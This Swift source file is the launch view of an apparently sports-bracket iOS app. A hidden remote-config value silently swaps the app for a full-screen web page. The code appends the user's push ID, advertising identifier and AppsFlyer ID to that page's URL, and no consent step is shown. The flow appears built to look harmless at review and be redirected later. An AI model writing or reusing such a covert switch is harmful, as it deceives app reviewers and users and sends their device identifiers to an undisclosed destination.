
import SwiftUI
import AppsFlyerLib
import AdSupport
import FirebaseRemoteConfig

struct StartView: View {
    @AppStorage("gate") private var point: String = ""
    @AppStorage("activated") private var first = false

    @State private var showWeb = false

    var body: some View {
        ZStack {
            Turf.night.ignoresSafeArea()

            if showWeb {
                FeatureView(targetUrl: point)
                    .ignoresSafeArea()
            } else {
                SplashView()
            }
        }
        .onAppear {
            if !first {
                fetchRemoteConfig()
            } else {
                if point.isEmpty {
                    launchApp()
                } else {
                    showWeb = true
                }
            }
        }
    }

    private func fetchRemoteConfig() {
        let remoteConfig = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 3600
        remoteConfig.configSettings = settings

        remoteConfig.fetchAndActivate { _, error in
            DispatchQueue.main.async {
                if error != nil {
                    first = true
                    launchApp()
                    return
                }

                let value = remoteConfig["matchbracket"].stringValue
                if !value.isEmpty {
                    point = value
                    first = true
                    waitForPushId()
                } else {
                    first = true
                    launchApp()
                }
            }
        }
    }

    private func waitForPushId() {
        waitForAppsFlyer {
            let uuid = UserDefaults.standard.string(forKey: "pushid") ?? ""
            let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            let apsId = AppsFlyerLib.shared().getAppsFlyerUID()
            let params = "?ext=" + uuid + "&adv_id=" + idfa + "&aps_id=" + apsId
            point = point + params
            showWeb = true
        }
    }

    private func waitForAppsFlyer(_ completion: @escaping () -> Void) {
        Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { timer in
            if UserDefaults.standard.bool(forKey: "recieved") {
                timer.invalidate()
                completion()
            }
        }
    }

    private func launchApp() {
        guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
              let window = scene.windows.first else { return }
        let root = UIHostingController(rootView: MatchBracketApp())
        window.rootViewController = root
        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: nil)
    }
}
